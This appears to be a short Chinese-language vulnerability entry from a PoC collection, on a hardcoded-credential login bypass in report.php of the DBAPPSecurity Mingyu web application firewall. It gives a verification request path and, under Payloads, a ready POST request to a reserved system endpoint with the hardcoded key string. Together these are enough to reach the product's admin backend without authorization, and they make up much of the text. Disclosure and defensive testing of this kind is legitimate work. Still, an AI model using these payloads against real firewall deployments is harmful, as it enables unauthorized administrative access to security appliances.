# 安恒 明御WEB应用防火墙 report.php 任意用户登录漏洞

## 漏洞描述
安恒 明御WEB应用防火墙 report.php文件存在硬编码设置的Console用户登录，攻击者可以通过漏洞直接登录后台

## 危害等级
LOW

## 参考链接

## 漏洞复现方法
登录页面

![image-20220824142132930](images/202208241421007.png)

验证POC

```
/report.m?a=rpc-timed
```


## Payloads
```
/report.m?a=rpc-timed
```
```
POST /system.m?a=reserved
  
key=!@#dbapp-waf-dev-reserved#@!
```
